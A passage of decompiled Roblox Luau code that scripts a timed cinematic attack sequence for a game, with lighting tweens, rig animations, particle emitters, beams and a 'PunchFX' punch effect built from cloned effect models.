                                local v1399 = u1396

                                u1396.PivotTo(v1399, u1397)

                                u1396.Parent = _EFP

                                u1254._maid:give(u1398.Changed:Connect(function()
                                    u1396:PivotTo(u1397 * CFrame.new(0, 0, u1398.Value))
                                end))

                                local v1400 = u1396.Humanoid:LoadAnimation(u1277.MainRig)

                                v1400:Play()

                                v1400.TimePosition = 21.13

                                local v1401 = u1396
                                local v1402, v1403, v1404 = pairs(u1396.GetChildren(v1401))
                                local u1405 = u1396

                                while true do
                                    local v1406, v1407 = v1402(v1403, v1404)

                                    if v1406 == nil then
                                        break
                                    end

                                    v1404 = v1406

                                    if v1407:IsA('Model') and v1407:FindFirstChild('Humanoid') then
                                        local _Humanoid3 = v1407:FindFirstChild('Humanoid')

                                        if _Humanoid3 then
                                            local v1409 = _Humanoid3:LoadAnimation(u1277.EachRig)

                                            v1409:Play()

                                            v1409.TimePosition = 21.13
                                        end
                                    end
                                end

                                local u1410 = _QuickFX({
                                    FX = _vfx.Everything:Clone(),
                                    Maid = u1254._maid,
                                    Anchor = u1395.PrimaryPart.CFrame * CFrame.new(0, 500, 0),
                                })

                                game.Debris:AddItem(u1410, 5)

                                local u1411 = u1254._maid:give(Instance.new('NumberValue'))

                                u1411.Value = 1

                                u10:Create(u1411, TweenInfo.new(3, Enum.EasingStyle.Sine), {Value = 4}):Play()

                                local u1412 = CFrame.new(0, 0, 0) * CFrame.Angles(1.5707963267948966, -3.141592653589793, 0)

                                task.spawn(function()
                                    local v1413 = tick()

                                    while tick() - v1413 < 5 do
                                        local v1414 = u1410
                                        local v1415, v1416, v1417 = pairs(v1414:GetChildren())

                                        while true do
                                            local v1418

                                            v1417, v1418 = v1415(v1416, v1417)

                                            if v1417 == nil then
                                                break
                                            end
                                            if v1418.Name == 'Clouds' then
                                                local v1419, v1420, v1421 = pairs(v1418:GetChildren())

                                                while true do
                                                    local v1422

                                                    v1421, v1422 = v1419(v1420, v1421)

                                                    if v1421 == nil then
                                                        break
                                                    end
                                                    if v1422.Name:find('Cloud') then
                                                        v1422.Name = u1252:NextNumber(-2, -0.5)
                                                    end

                                                    v1422.CFrame = v1422.CFrame * CFrame.Angles(0, math.rad((tonumber(v1422.Name))), 0)
                                                end
                                            end
                                        end

                                        if tick() - v1413 >= 3 then
                                            local v1423 = u1405
                                            local v1424, v1425, v1426 = pairs(v1423:GetChildren())

                                            while true do
                                                local v1427

                                                v1426, v1427 = v1424(v1425, v1426)

                                                if v1426 == nil then
                                                    break
                                                end
                                                if v1427:IsA('Model') then
                                                    local _HumanoidRootPart5 = v1427:FindFirstChild('HumanoidRootPart')

                                                    if _HumanoidRootPart5 then
                                                        _HumanoidRootPart5.RootJoint.C0 = u1412
                                                    end
                                                end
                                            end
                                        else
                                            local v1429 = u1405
                                            local v1430, v1431, v1432 = pairs(v1429:GetChildren())

                                            while true do
                                                local v1433

                                                v1432, v1433 = v1430(v1431, v1432)

                                                if v1432 == nil then
                                                    break
                                                end
                                                if v1433:IsA('Model') and v1433.Name ~= '1' then
                                                    local _HumanoidRootPart6 = v1433:FindFirstChild('HumanoidRootPart')

                                                    if _HumanoidRootPart6 then
                                                        local _, _, _ = _HumanoidRootPart6.RootJoint.C0:ToOrientation()
                                                        local v1435 = u1252

                                                        _HumanoidRootPart6.RootJoint.C0 = u1412 * CFrame.new(v1435:NextNumber(-u1411.Value, u1411.Value), 0, 0)
                                                    end
                                                end
                                            end
                                        end

                                        _dtwait(0.01)
                                    end
                                end)
                                task.delay(2, function()
                                    local _spawn4 = task.spawn
                                    local u1437 = true

                                    _spawn4(function()
                                        if u1437 then
                                            u10:Create(game.Lighting, TweenInfo.new(1.827, Enum.EasingStyle.Quad), {
                                                Brightness = 0,
                                                Ambient = Color3.fromRGB(0, 0, 0),
                                                OutdoorAmbient = Color3.fromRGB(25, 25, 25),
                                            }):Play()
                                            u10:Create(game.Lighting, TweenInfo.new(0.65, Enum.EasingStyle.Quad), {ClockTime = 0}):Play()
                                        else
                                            u10:Create(game.Lighting, TweenInfo.new(1.827, Enum.EasingStyle.Quad), {
                                                Brightness = 2,
                                                Ambient = Color3.fromRGB(138, 138, 138),
                                                OutdoorAmbient = Color3.fromRGB(70, 70, 70),
                                            }):Play()
                                            u10:Create(game.Lighting, TweenInfo.new(0.65, Enum.EasingStyle.Quad), {ClockTime = 13}):Play()
                                        end
                                    end)

                                    local v1438 = u1254._maid:give(Instance.new('PointLight'))

                                    v1438.Range = 5
                                    v1438.Brightness = 5
                                    v1438.Color = Color3.new(1, 0.411765, 0.305882)
                                    v1438.Parent = u1405['1'].Torso

                                    local v1439 = _QuickFX
                                    local v1440 = {
                                        FX = _vfx.Particles2,
                                        Maid = u1254._maid,
                                    }
                                    local _, v1441, _ = u1257.HumanoidRootPart.CFrame:ToOrientation()

                                    v1440.Anchor = CFrame.new(u1257.Torso.Position) * CFrame.Angles(0, v1441, 0)

                                    local v1442 = v1439(v1440)

                                    _Able({
                                        FX = v1442,
                                        On = true,
                                    })
                                    u10:Create(u1395.PrimaryPart.Decal, TweenInfo.new(0.3, Enum.EasingStyle.Sine), {Transparency = 1}):Play()
                                    _dtwait(0.3)
                                    u1395:Destroy()
                                    _LifeScale({
                                        FX = v1442,
                                        Scale = 0.5,
                                    })

                                    local v1443, v1444, v1445 = pairs(v1442:GetDescendants())

                                    while true do
                                        local v1446

                                        v1445, v1446 = v1443(v1444, v1445)

                                        if v1445 == nil then
                                            break
                                        end
                                        if v1446:IsA('ParticleEmitter') then
                                            v1446.Rate = v1446.Rate * 0.5
                                        end
                                    end

                                    _dtwait(2.3)
                                    _Able({
                                        FX = v1442,
                                        On = false,
                                    })
                                    v1438:Destroy()
                                end)

                                local u1447 = {
                                    [u1395.Inner] = {
                                        Scale = u1395.Inner.Mesh.Scale,
                                        Size = u1395.Inner.Size,
                                        CFrame = u1395.Inner.CFrame,
                                    },
                                    [u1395.Outer] = {
                                        CFrame = u1395.Outer.CFrame,
                                        Scale = u1395.Outer.Mesh.Scale,
                                        Size = u1395.Outer.Size,
                                    },
                                }
                                local u1448 = u1254._maid:give(Instance.new('NumberValue'))

                                u1448.Value = 1

                                u1254._maid:give(u1448.Changed:Connect(function()
                                    local v1449, v1450, v1451 = pairs(u1447)

                                    while true do
                                        local v1452

                                        v1451, v1452 = v1449(v1450, v1451)

                                        if v1451 == nil then
                                            break
                                        end
                                        if v1451.Parent then
                                            v1451.Mesh.Scale = Vector3.new(v1452.Scale.X, v1452.Scale.Y * u1448.Value, v1452.Scale.Z)
                                            v1451.CFrame = v1452.CFrame * CFrame.new(0, v1451.Size.Y * 0.5, 0)
                                        end
                                    end
                                end))

                                u1448.Value = 0.1

                                u10:Create(u1448, TweenInfo.new(9, Enum.EasingStyle.Sine), {Value = 22}):Play()

                                local v1453, v1454, v1455 = pairs(u1395:GetChildren())
                                local v1456 = u1447

                                while true do
                                    local v1457

                                    v1455, v1457 = v1453(v1454, v1455)

                                    if v1455 == nil then
                                        break
                                    end

                                    v1457.Decal.Transparency = 1

                                    u10:Create(v1457.Decal, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {Transparency = 0}):Play()
                                end

                                local v1458, v1459, u1460 = pairs(v1456)

                                while true do
                                    local v1461

                                    u1460, v1461 = v1458(v1459, u1460)

                                    if u1460 == nil then
                                        break
                                    end

                                    task.spawn(function()
                                        local _Folder4 = u1460:FindFirstChild('Folder')
                                        local _Decal3 = u1460:FindFirstChild('Decal')

                                        for _ = 1, 10 do
                                            if not u1395:IsDescendantOf(game.Workspace) then
                                                break
                                            end

                                            for v1464 = 1, #_Folder4:GetChildren()do
                                                local v1465 = _Folder4:FindFirstChild((tostring(v1464))) or _Folder4:GetChildren()[#_Folder4:GetChildren()]

                                                if v1465 then
                                                    _Decal3.Texture = v1465.Texture
                                                end

                                                _dtwait(0.01)
                                            end
                                        end
                                    end)
                                end

                                game.Debris:AddItem(u1395, 4.6)
                            end

                            local _ = _RootPart
                            local u1467 = v1088
                            local u1468 = v1090
                            local u1469 = v1154
                            local u1470 = v1147
                            local u1471 = v1149
                            local u1472 = v1164
                            local u1473 = _UFW
                            local u1474 = _RootPart
                            local v1649 = {
                                [0.9] = function()
                                    u1232:Destroy()
                                    _ColorCorrectionEffect:Destroy()
                                    _RightArm:Destroy()
                                    _LeftArm:Destroy()

                                    u1231.Vignette.Visible = false
                                    u1237.Floor.Decal.Transparency = 0
                                    u1237.Wall2.Decal.Transparency = 0
                                    u1237.light.SpotLight.Enabled = true
                                    u1237.light.SurfaceLight.Enabled = true
                                    u1237.light2.SpotLight.Enabled = false

                                    local v1475, v1476, v1477 = pairs(u1237['beams on floor']:GetDescendants())

                                    while true do
                                        local v1478

                                        v1477, v1478 = v1475(v1476, v1477)

                                        if v1477 == nil then
                                            break
                                        end
                                        if v1478:IsA('Beam') then
                                            v1478.Enabled = true
                                        end
                                    end

                                    u1467.Speak(u1468, u1469[2])
                                end,
                                [2.483] = function()
                                    u1237.Floor.Decal.Transparency = 1

                                    u1237.Wall2:Destroy()
                                    u1237['beams on floor']:Destroy()
                                    u1237.light:Destroy()
                                    u1237.light2:Destroy()

                                    u1237.BG.Transparency = 1
                                    game.Lighting.ClockTime = 14.5
                                    game.Lighting.EnvironmentDiffuseScale = 1
                                    u1237.Floor2.floorspeed.runrunrun.Enabled = true
                                    u1237.Floor2.floorspeed.runrunrun2.Enabled = true
                                    u1237.Floor2.Lines['12'].Enabled = true
                                    u1237.UFWSkyroom.Transparency = 0
                                    u1237.UFWSkyroom.Size = Vector3.one * 400

                                    local u1479 = nil

                                    u1479 = u1470.Stepped:Connect(function()
                                        if u1237.Parent and u1237:FindFirstChild('UFWSkyroom') then
                                            u1237.UFWSkyroom.Position = workspace.CurrentCamera.CFrame.Position
                                        else
                                            u1479:Disconnect()
                                        end
                                    end)

                                    table.insert(u1471, u1479)

                                    local v1480, v1481, v1482 = pairs(u1237.Bem.beams:GetChildren())

                                    while true do
                                        local v1483

                                        v1482, v1483 = v1480(v1481, v1482)

                                        if v1482 == nil then
                                            break
                                        end

                                        v1483.Enabled = true
                                    end

                                    local v1484, v1485, v1486 = pairs(u1237.UFWSkyroom:GetChildren())

                                    while true do
                                        local v1487

                                        v1486, v1487 = v1484(v1485, v1486)

                                        if v1486 == nil then
                                            break
                                        end
                                        if v1487:IsA('ParticleEmitter') then
                                            v1487.Enabled = true
                                        else
                                            v1487.Transparency = 0
                                        end
                                    end

                                    u1472(u1230, 3, 10, 0.04)

                                    local _BloomEffect = Instance.new('BloomEffect')

                                    _BloomEffect.Intensity = 0.5
                                    _BloomEffect.Size = 56
                                    _BloomEffect.Threshold = 0.75
                                    _BloomEffect.Parent = game.Lighting

                                    table.insert(u1471, _BloomEffect)
                                end,
                                [4.033] = function()
                                    u1237.Bem:Destroy()

                                    local v1489, v1490, v1491 = pairs(u1237.Floor2.Lines2:GetChildren())

                                    while true do
                                        local v1492

                                        v1491, v1492 = v1489(v1490, v1491)

                                        if v1491 == nil then
                                            break
                                        end

                                        v1492.Enabled = true
                                    end

                                    task.delay(0.167, function()
                                        u1237.Floor.Foot1.ToonLightning1:Emit(1)
                                        task.wait(0.367)
                                        u1237.Floor.Foot2.ToonLightning1:Emit(1)
                                    end)

                                    local v1493 = u1188
                                    local v1494, v1495, v1496 = pairs(v1493:GetChildren())

                                    while true do
                                        local v1497

                                        v1496, v1497 = v1494(v1495, v1496)

                                        if v1496 == nil then
                                            break
                                        end
                                        if v1497:IsA('BasePart') then
                                            u1473.Aura:Clone().Parent = v1497
                                        end
                                    end
                                end,
                                [5.55] = function()
                                    u1472(u1230, 11, 23, 0.03)
                                end,
                                [7.15] = function()
                                    u1237.Floor2.floorspeed.runrunrun.Enabled = false
                                    u1237.Floor2.floorspeed.runrunrun2.Enabled = false
                                    u1237.Floor2.Lines['12'].Enabled = false

                                    local v1498, v1499, v1500 = pairs(u1237.Floor2.Lines2:GetChildren())

                                    while true do
                                        local v1501

                                        v1500, v1501 = v1498(v1499, v1500)

                                        if v1500 == nil then
                                            break
                                        end

                                        v1501.Enabled = false
                                    end
                                end,
                                [8.2] = function()
                                    task.spawn(u1276)

                                    local v1502, v1503, v1504 = pairs(u1473.FistSmear:GetChildren())

                                    while true do
                                        local v1505

                                        v1504, v1505 = v1502(v1503, v1504)

                                        if v1504 == nil then
                                            break
                                        end

                                        local u1506 = v1505:Clone()

                                        u1506.Parent = u1188['Right Arm']

                                        task.delay(1, function()
                                            u1506:Destroy()
                                        end)
                                    end

                                    task.wait(0.1)
                                    u1237.Floor2.wave.ToonLightning1:Emit(1)
                                    u1237.Floor2.wave.ToonLightning12:Emit(1)
                                end,
                                [8.85] = function()
                                    task.spawn(u1294)
                                end,
                                [9.2] = function()
                                    u1237.BG.Transparency = 0
                                    u1237.BG.Color = Color3.new(0, 0, 0)

                                    u1237.UFWSkyroom:Destroy()

                                    u1237.KJWallBreak['1'].Transparency = 0
                                    game.Lighting.EnvironmentDiffuseScale = 0

                                    local v1507 = u1188:Clone()

                                    v1507.HumanoidRootPart.Anchored = true
                                    v1507.PrimaryPart = v1507.HumanoidRootPart

                                    v1507:SetPrimaryPartCFrame(u1188.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5) * CFrame.Angles(0, 3.141592653589793, 0))

                                    v1507.Parent = game.Workspace

                                    local v1508, v1509, v1510 = pairs(v1507:GetDescendants())

                                    while true do
                                        local v1511

                                        v1510, v1511 = v1508(v1509, v1510)

                                        if v1510 == nil then
                                            break
                                        end
                                        if v1511:IsA('BasePart') then
                                            v1511.Transparency = 0.55
                                        end
                                    end

                                    local v1512 = v1507.Humanoid:LoadAnimation(u1473.Mirror)

                                    v1512:Play()

                                    v1512.TimePosition = 12.25

                                    game.Debris:AddItem(v1507, 2)
                                end,
                                [9.5] = function()
                                    task.spawn(u1309)
                                end,
                                [9.867] = function()
                                    local v1513, v1514, v1515 = pairs(u1237.Gura.Slamy:GetChildren())

                                    while true do
                                        local v1516

                                        v1515, v1516 = v1513(v1514, v1515)

                                        if v1515 == nil then
                                            break
                                        end

                                        v1516:Emit(v1516:GetAttribute('EmitCount'))
                                    end

                                    task.spawn(function()
                                        u1231.Flexworks.Visible = true

                                        u10:Create(u1231.Flexworks, TweenInfo.new(0.1, Enum.EasingStyle.Exponential), {
                                            Size = UDim2.new(1.4, 0, 0.8, 0),
                                        }):Play()
                                        u10:Create(u1231.Flexworks, TweenInfo.new(0.6, Enum.EasingStyle.Elastic), {
                                            Position = UDim2.new(0.5, 0, 0.5, 0),
                                        }):Play()
                                        u1472(u1230, 24, 25, 0.03)
                                    end)

                                    u1237.KJWallBreak['3'].Transparency = 0

                                    local _ColorCorrectionEffect2 = Instance.new('ColorCorrectionEffect')

                                    _ColorCorrectionEffect2.Brightness = 0.75
                                    _ColorCorrectionEffect2.TintColor = Color3.fromRGB(5, 240, 255)
                                    _ColorCorrectionEffect2.Parent = game.Lighting

                                    u10:Create(_ColorCorrectionEffect2, TweenInfo.new(1), {
                                        Brightness = 0,
                                        TintColor = Color3.new(1, 1, 1),
                                    }):Play()
                                    task.wait(1)
                                    _ColorCorrectionEffect2:Destroy()
                                end,
                                [11] = function()
                                    local _spawn5 = task.spawn
                                    local u1519 = false

                                    _spawn5(function()
                                        if u1519 then
                                            u10:Create(game.Lighting, TweenInfo.new(1.827, Enum.EasingStyle.Quad), {
                                                Brightness = 0,
                                                Ambient = Color3.fromRGB(0, 0, 0),
                                                OutdoorAmbient = Color3.fromRGB(25, 25, 25),
                                            }):Play()
                                            u10:Create(game.Lighting, TweenInfo.new(0.65, Enum.EasingStyle.Quad), {ClockTime = 0}):Play()
                                        else
                                            u10:Create(game.Lighting, TweenInfo.new(1.827, Enum.EasingStyle.Quad), {
                                                Brightness = 2,
                                                Ambient = Color3.fromRGB(138, 138, 138),
                                                OutdoorAmbient = Color3.fromRGB(70, 70, 70),
                                            }):Play()
                                            u10:Create(game.Lighting, TweenInfo.new(0.65, Enum.EasingStyle.Quad), {ClockTime = 13}):Play()
                                        end
                                    end)
                                    u1237.KJWallBreak:Destroy()

                                    local v1520 = u1254._maid:give(u1473.RB:Clone())

                                    v1520:SetPrimaryPartCFrame(u1188.HumanoidRootPart.CFrame * CFrame.new(0.2122097611427307, -0.04167747497558594, -4.24620246887207))

                                    v1520.Parent = _EFP

                                    local v1521 = v1520.AnimationController:LoadAnimation(u1473.GlassBreak)

                                    v1521:Play(0)
                                    v1521:Stop(0)
                                    v1521:Play()
                                    game.Debris:AddItem(v1520, 3)
                                    task.spawn(u1329)
                                end,
                                [11.9] = function()
                                    task.spawn(u1358)
                                end,
                                [12.3] = function()
                                    local v1522 = u1254._maid:give(u1473.Fade:Clone())

                                    v1522.Parent = _LocalPlayer3.PlayerGui

                                    _dtwait(0.05)
                                    u10:Create(v1522.Fade, TweenInfo.new(0.3, Enum.EasingStyle.Sine), {BackgroundTransparency = 1}):Play()
                                end,
                                [12.83] = function()
                                    task.spawn(u1390)
                                end,
                                [18.1] = function()
                                    local v1523 = u1188
                                    local v1524, v1525, v1526 = pairs(v1523:GetDescendants())
                                    local v1527 = {}

                                    while true do
                                        local v1528

                                        v1526, v1528 = v1524(v1525, v1526)

                                        if v1526 == nil then
                                            break
                                        end
                                        if v1528:IsA('BasePart') or v1528:IsA('Decal') then
                                            v1527[v1528] = v1528.Transparency
                                            v1528.Transparency = 1
                                        elseif v1528:IsA('ParticleEmitter') and v1528.Name == 'Aura' then
                                            v1528.Enabled = false
                                        end
                                    end

                                    task.spawn(u1466)
                                    task.wait(5)

                                    local v1529, v1530, v1531 = pairs(v1527)

                                    while true do
                                        local v1532

                                        v1531, v1532 = v1529(v1530, v1531)

                                        if v1531 == nil then
                                            break
                                        end

                                        v1531.Transparency = v1532
                                    end
                                end,
                                [23] = function()
                                    task.spawn(function()
                                        shared.sfx({
                                            SoundId = 'rbxassetid://118747531933793',
                                            Volume = 7,
                                            Parent = workspace,
                                        })

                                        local v1533 = {}

                                        v1533.__index = v1533

                                        local v1534 = u202
                                        local _PlayAttachment2 = v1534.PlayAttachment
                                        local _Maid2 = v1534.Maid
                                        local _PlayTween2 = v1534.PlayTween
                                        local _ = v1534.CamShake
                                        local _ = v1534.PlayFlipBook
                                        local _dtwait2 = v1534.dtwait
                                        local _ = v1534.EFP
                                        local _PlayMesh2 = v1534.PlayMesh
                                        local _ = v1534.Impact
                                        local _ = v1534.GlassLight
                                        local _ = v1534.RaiseZIndex
                                        local _Able2 = v1534.Able
                                        local _LifeScale2 = v1534.LifeScale
                                        local _QuickFX2 = v1534.QuickFX
                                        local _ = v1534.QuickWeld
                                        local _ = v1534.Yield
                                        local _ = v1534.ProcessPart
                                        local _ = v1534.WeldObject

                                        Random.new()

                                        local _vfx2 = game.ReplicatedStorage.Resources.UFW.vfx
                                        local v1544 = setmetatable({}, v1533)

                                        v1544._maid = _Maid2.new()

                                        local u1545 = v1544
                                        local u1546 = false

                                        task.delay(10, function()
                                            if not u1546 then
                                                u1546 = true

                                                u1545._maid:doCleaning()
                                            end
                                        end)

                                        local _PrimaryPart4 = u201(p1086).PrimaryPart
                                        local _Thrown2 = workspace.Thrown
                                        local _UFW2 = game.ReplicatedStorage.Resources.UFW
                                        local u1550 = _vfx2
                                        local u1551 = _dtwait2
                                        local u1552 = _PrimaryPart4
                                        local u1553 = _QuickFX2
                                        local u1554 = _Able2
                                        local u1555 = _PlayMesh2
                                        local u1556 = _Thrown2
                                        local u1557 = _UFW2
                                        local u1558 = _PlayAttachment2
                                        local u1559 = _LifeScale2
                                        local u1560 = _PlayTween2

                                        spawn(function()
                                            (function()
                                                local _PunchFX = u1550.PunchFX

                                                u201()

                                                local u1562 = {}

                                                task.spawn(function()
                                                    local v1563 = tick()

                                                    while tick() - v1563 < 5 do
                                                        local v1564, v1565, v1566 = pairs(u1562)

                                                        while true do
                                                            local v1567

                                                            v1566, v1567 = v1564(v1565, v1566)

                                                            if v1566 == nil then
                                                                break
                                                            end
                                                            if v1567.Parent then
                                                                local v1568, v1569, v1570 = pairs(u1562)

                                                                while true do
                                                                    local v1571

                                                                    v1570, v1571 = v1568(v1569, v1570)

                                                                    if v1570 == nil then
                                                                        break
                                                                    end

                                                                    v1571.OffsetStudsU = v1571.OffsetStudsU + 0.3
                                                                    v1571.OffsetStudsV = v1571.OffsetStudsV + 0.3
                                                                end
                                                            end
                                                        end

                                                        u1551(0.01)
                                                    end
                                                end)

                                                local function u1578(p1572, p1573)
                                                    local v1574, v1575, v1576 = pairs(p1572:GetDescendants())

                                                    while true do
                                                        local v1577

                                                        v1576, v1577 = v1574(v1575, v1576)

                                                        if v1576 == nil then
                                                            break
                                                        end
                                                        if v1577:IsA('Texture') then
                                                            table.insert(u1562, v1577)
                                                            u10:Create(v1577, TweenInfo.new(p1573, Enum.EasingStyle.Sine), {Transparency = 1}):Play()
                                                        end
                                                    end
                                                end

                                                local u1579 = u1552

                                                local function v1622()
                                                    local v1580 = u1545._maid:give(_PunchFX.Shard:Clone())

                                                    v1580:ScaleTo(2)
                                                    u1555({
                                                        Model = v1580,
                                                        T = 0,
                                                        EndT = 0,
                                                        Anchor = u1579.CFrame * CFrame.new(0, 0, -66) * CFrame.Angles(0, 1.5707963267948966, 0),
                                                        Info = TweenInfo.new(0.1, Enum.EasingStyle.Exponential),
                                                    })

                                                    local v1581 = u1579.CFrame * CFrame.new(0, 0, -10) * CFrame.Angles(1.5707963267948966, 0, 0)
                                                    local v1582 = u1545._maid:give(_PunchFX.StartThing:Clone())

                                                    v1582:PivotTo(v1581)

                                                    v1582.Parent = u1556

                                                    game.Debris:AddItem(v1582, 2)

                                                    local v1583 = u1545._maid:give(_PunchFX.EndThing:Clone())

                                                    v1583:PivotTo(v1581)

                                                    v1583.Parent = u1556

                                                    task.spawn(function()
                                                        u1545.Impact1 = u1545._maid:give(u1557:FindFirstChild('1'):Clone())
                                                        u1545.Impact1.Parent = game.Lighting

                                                        u1551(0.07)
                                                        u1545.Impact1:Destroy()

                                                        u1545.Impact2 = u1545._maid:give(u1557:FindFirstChild('2'):Clone())
                                                        u1545.Impact2.Parent = game.Lighting

                                                        u1551(0.07)
                                                        u1545.Impact2:Destroy()
                                                    end)

                                                    local v1584, v1585, v1586 = pairs(v1582:GetChildren())

                                                    while true do
                                                        local v1587

                                                        v1586, v1587 = v1584(v1585, v1586)

                                                        if v1586 == nil then
                                                            break
                                                        end

                                                        local v1588 = v1583:FindFirstChild(v1587.Name)

                                                        if v1588 then
                                                            u10:Create(v1587, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {
                                                                Size = v1588.Size,
                                                                CFrame = v1588.CFrame,
                                                            }):Play()
                                                        end
                                                    end

                                                    game.Debris:AddItem(v1582, 0.05)

                                                    local v1589 = u1553({
                                                        FX = _PunchFX.groundsmoke,
                                                        Anchor = u1579.CFrame * CFrame.new(0, -u1579.Size.Y * 1.5, 0) * CFrame.Angles(0, 3.141592653589793, 0),
                                                        Maid = u1545._maid,
                                                    })

                                                    u1558(v1589)
                                                    v1589:ScaleTo(2)
                                                    u1559({
                                                        FX = v1589,
                                                        Scale = 2,
                                                    })
                                                    u1559({
                                                        FX = v1589.PrimaryPart.emitLeft,
                                                        Scale = 0.2,
                                                    })
                                                    u1559({
                                                        FX = v1589.PrimaryPart.emitRight,
                                                        Scale = 0.2,
                                                    })
                                                    task.spawn(function()
                                                        for v1590 = 1, 3 do
                                                            local v1591 = u1553({
                                                                FX = _PunchFX.Wind,
                                                                Anchor = u1579.CFrame * CFrame.new(0, -u1579.Size.Y * 1.5, 10) * CFrame.Angles(0, 0, 0),
                                                                Maid = u1545._maid,
                                                            })

                                                            v1591:ScaleTo(v1590 * 2)
                                                            u1559({
                                                                FX = v1591,
                                                                Scale = 0.5 * (v1590 * 0.8),
                                                            })
                                                            u1558(v1591)
                                                            u1551(0.05)
                                                        end
                                                    end)

                                                    local v1592 = u1545._maid:give(_PunchFX.ohyea:Clone())

                                                    v1592:ScaleTo(8)
                                                    u1555({
                                                        Model = v1592,
                                                        T = 0,
                                                        Anchor = u1579.CFrame * CFrame.new(0, 0, -20) * CFrame.Angles(0, -1.5707963267948966, 0),
                                                        Info = TweenInfo.new(3, Enum.EasingStyle.Exponential),
                                                    })

                                                    local v1593 = _PunchFX.Next:Clone()

                                                    v1593:ScaleTo(4)
                                                    u1555({
                                                        Model = v1593,
                                                        T = 0,
                                                        Anchor = u1579.CFrame * CFrame.new(0, 0, -20) * CFrame.Angles(0, 1.5707963267948966, 0),
                                                        Info = TweenInfo.new(4, Enum.EasingStyle.Exponential),
                                                    })

                                                    local v1594 = _PunchFX.BallThing:Clone()

                                                    v1594:ScaleTo(4)
                                                    u1555({
                                                        Model = v1594,
                                                        Anchor = u1579.CFrame * CFrame.new(0, 0, -20) * CFrame.Angles(0, 0, 0),
                                                        Info = TweenInfo.new(3, Enum.EasingStyle.Exponential),
                                                    })
                                                    u1578(v1594, 1)
                                                    task.spawn(function()
                                                        for v1595 = 1, 3 do
                                                            local v1596 = _PunchFX.Test:Clone()

                                                            v1596:ScaleTo(8 - v1595 * 0.7)
                                                            u1555({
                                                                Model = v1596,
                                                                T = 0.3,
                                                                Anchor = u1579.CFrame * CFrame.new(0, 0, -10 * v1595 * 2) * CFrame.Angles(-1.5707963267948966, -1.5707963267948966, 0),
                                                                Info = TweenInfo.new(0.4 * v1595, Enum.EasingStyle.Exponential),
                                                            })
                                                            u1551(0.05)
                                                        end
                                                    end)

                                                    local v1597 = u1553({
                                                        FX = _PunchFX.PunchBig,
                                                        Maid = u1545._maid,
                                                        Anchor = u1579.CFrame * CFrame.new(0, 0, -100),
                                                    })

                                                    v1597:ScaleTo(1.4)
                                                    u1559({
                                                        FX = v1597,
                                                        Scale = 0.4,
                                                    })
                                                    u1558(v1597)

                                                    local v1598 = u1553({
                                                        FX = _PunchFX.ParticlesEnd,
                                                        Anchor = u1579.CFrame * CFrame.new(0, 5, 30),
                                                        Maid = u1545._maid,
                                                    })

                                                    v1598:ScaleTo(2)
                                                    u1559({
                                                        FX = v1598,
                                                        Scale = 2,
                                                    })
                                                    u1558(v1598)

                                                    local v1599 = u1553({
                                                        FX = _PunchFX.Emit,
                                                        Anchor = u1579.CFrame * CFrame.new(0, 0, -100),
                                                        Maid = u1545._maid,
                                                    })

                                                    v1599:ScaleTo(1.4)
                                                    u1559({
                                                        FX = v1599,
                                                        Scale = 2,
                                                    })

                                                    local v1600, v1601, v1602 = pairs(v1599:GetDescendants())

                                                    while true do
                                                        local v1603

                                                        v1602, v1603 = v1600(v1601, v1602)

                                                        if v1602 == nil then
                                                            break
                                                        end
                                                        if v1603:IsA('ParticleEmitter') then
                                                            v1603:SetAttribute('EmitCount', v1603:GetAttribute('EmitCount') * 0.5)
                                                        end
                                                    end

                                                    u1558(v1599)

                                                    local v1604 = u1553({
                                                        FX = _PunchFX.Beam,
                                                        Maid = u1545._maid,
                                                        Anchor = u1579.CFrame * CFrame.new(0, 0, -240),
                                                    })

                                                    v1604:ScaleTo(1.4)

                                                    local v1605, v1606, v1607 = pairs(v1604:GetDescendants())

                                                    while true do
                                                        local v1608

                                                        v1607, v1608 = v1605(v1606, v1607)

                                                        if v1607 == nil then
                                                            break
                                                        end
                                                        if v1608.Name:find('Far') then
                                                            local _CFrame8 = v1608.CFrame
                                                            local v1610, v1611, v1612 = _CFrame8:ToOrientation()

                                                            v1608.CFrame = CFrame.new(0, 0, -v1608.CFrame.Position.Z) * CFrame.Angles(v1610, v1611, v1612)

                                                            u10:Create(v1608, TweenInfo.new(0.4, Enum.EasingStyle.Sine), {CFrame = _CFrame8}):Play()
                                                        elseif v1608:IsA('Beam') then
                                                            u10:Create(v1608, TweenInfo.new(3, Enum.EasingStyle.Sine), {TextureSpeed = 0}):Play()
                                                            u1560(v1608, {
                                                                Time = 2,
                                                                EasingStyle = 'Sine',
                                                                Goal = {
                                                                    Transparency = NumberSequence.new({
                                                                        NumberSequenceKeypoint.new(0, 1),
                                                                        NumberSequenceKeypoint.new(1, 1),
                                                                    }),
                                                                },
                                                            })
                                                            game.Debris:AddItem(v1608, 2)
                                                        end
                                                    end

                                                    local v1613 = u1553({
                                                        FX = _PunchFX.NewBeams,
                                                        Maid = u1545._maid,
                                                        Anchor = u1579.CFrame * CFrame.new(0, 0, -44) * CFrame.Angles(0, 0, -0.5235987755982988),
                                                    })

                                                    v1613:ScaleTo(4)
                                                    u1551(0.5)

                                                    local v1614, v1615, v1616 = pairs(v1613:GetDescendants())

                                                    while true do
                                                        local v1617

                                                        v1616, v1617 = v1614(v1615, v1616)

                                                        if v1616 == nil then
                                                            break
                                                        end
                                                        if v1617.Name:find('Far') then
                                                            local _CFrame9 = v1617.CFrame
                                                            local v1619, v1620, v1621 = _CFrame9:ToOrientation()

                                                            v1617.CFrame = CFrame.new(0, 0, -v1617.CFrame.Position.Z) * CFrame.Angles(v1619, v1620, v1621)

                                                            u10:Create(v1617, TweenInfo.new(0.4, Enum.EasingStyle.Sine), {CFrame = _CFrame9}):Play()
                                                        elseif v1617:IsA('Beam') then
                                                            u10:Create(v1617, TweenInfo.new(3, Enum.EasingStyle.Sine), {TextureSpeed = 0}):Play()
                                                            u1560(v1617, {
                                                                Time = 2,
                                                                EasingStyle = 'Sine',
                                                                Goal = {
                                                                    Transparency = NumberSequence.new({
                                                                        NumberSequenceKeypoint.new(0, 1),
                                                                        NumberSequenceKeypoint.new(1, 1),
                                                                    }),
                                                                },
                                                            })
                                                            game.Debris:AddItem(v1617, 2)
                                                        end
                                                    end

                                                    u1551(1)
                                                end

                                                (function()
                                                    local _ = u1579.CFrame * CFrame.new(0, -u1579.Size.Y * 1.5, 0)
                                                    local v1623 = u1553({
                                                        FX = _PunchFX.Charge,
